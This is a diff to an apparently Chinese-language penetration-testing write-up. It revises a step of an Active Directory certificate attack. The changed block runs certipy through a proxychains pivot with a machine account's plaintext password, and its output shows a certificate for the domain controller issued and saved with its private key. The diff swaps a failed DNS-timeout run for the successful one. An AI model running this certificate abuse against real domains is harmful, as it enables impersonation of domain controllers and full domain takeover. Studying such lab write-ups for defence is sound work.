@@ -836,9 +836,17 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 配置hosts，请求证书
 ```bash
-☁  endless  proxychains4 -f /etc/proxychains4-24.conf certipy-ad req -u 'evil$@pentest.me' -p Qwer1234 -ca 'pentest-DC-CA' -dc-ip 172.24.7.3  -template Machine -debug
-[proxychains] config file found: /etc/proxychains4-24.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+proxychains4 -f /usr/local/etc/proxychains-24.conf certipy req \
+    -u 'evil$@pentest.me' \
+    -p Qwer1234 \
+    -ca 'pentest-DC-CA' \
+    -dc-ip 172.24.7.3 \
+    -target-ip 172.24.7.3 \
+    -template Machine \
+    -debug
+[proxychains] config file found: /usr/local/etc/proxychains-24.conf
+[proxychains] preloading /usr/local/Cellar/proxychains-ng/4.17/lib/libproxychains4.dylib
+[proxychains] DLL init: proxychains-ng 4.17
 [proxychains] DLL init: proxychains-ng 4.17
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
@@ -846,33 +854,22 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 [+] Nameserver: '172.24.7.3'
 [+] DC IP: '172.24.7.3'
 [+] DC Host: 'PENTEST.ME'
-[+] Target IP: None
-[+] Remote Name: 'PENTEST.ME'
+[+] Target IP: '172.24.7.3'
+[+] Remote Name: '172.24.7.3'
 [+] Domain: 'PENTEST.ME'
 [+] Username: 'EVIL$'
-[+] Trying to resolve 'PENTEST.ME' at '172.24.7.3'
-[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:172.24.7.3@53 answered The DNS operation timed out.; Server Do53:172.24.7.3@53 answered The DNS operation timed out.; Server Do53:172.24.7.3@53 answered The DNS operation timed out.
-Traceback (most recent call last):
-  File "/usr/lib/python3/dist-packages/certipy/lib/target.py", line 442, in resolve
-    answers = self.resolver.resolve(hostname, tcp=self.use_tcp)
-  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1328, in resolve
-    timeout = self._compute_timeout(start, lifetime, resolution.errors)
-  File "/usr/lib/python3/dist-packages/dns/resolver.py", line 1084, in _compute_timeout
-    raise LifetimeTimeout(timeout=duration, errors=errors)
-dns.resolver.LifetimeTimeout: The resolution lifetime expired after 5.404 seconds: Server Do53:172.24.7.3@53 answered The DNS operation timed out.; Server Do53:172.24.7.3@53 answered The DNS operation timed out.; Server Do53:172.24.7.3@53 answered The DNS operation timed out.
 [+] Generating RSA key
 [*] Requesting certificate via RPC
-[+] Trying to connect to endpoint: ncacn_np:224.0.0.1[\pipe\cert]
-[proxychains] Strict chain  ...  101.132.149.233:6001  ...  PENTEST.ME:445  ...  OK
-[+] Connected to endpoint: ncacn_np:224.0.0.1[\pipe\cert]
-[*] Request ID is 8
+[+] Trying to connect to endpoint: ncacn_np:172.24.7.3[\pipe\cert]
+[proxychains] Dynamic chain  ...  101.132.149.233:6001  ...  172.24.7.3:445  ...  OK
+[+] Connected to endpoint: ncacn_np:172.24.7.3[\pipe\cert]
+[*] Request ID is 9
 [*] Successfully requested certificate
 [*] Got certificate with DNS Host Name 'DC.pentest.me'
 [*] Certificate has no object SID
 [*] Try using -sid to set the object SID or see the wiki for more details
 [*] Saving certificate and private key to 'dc.pfx'
 [+] Attempting to write data to 'dc.pfx'
-File 'dc.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
 [+] Data written to 'dc.pfx'
 [*] Wrote certificate and private key to 'dc.pfx'
 ```
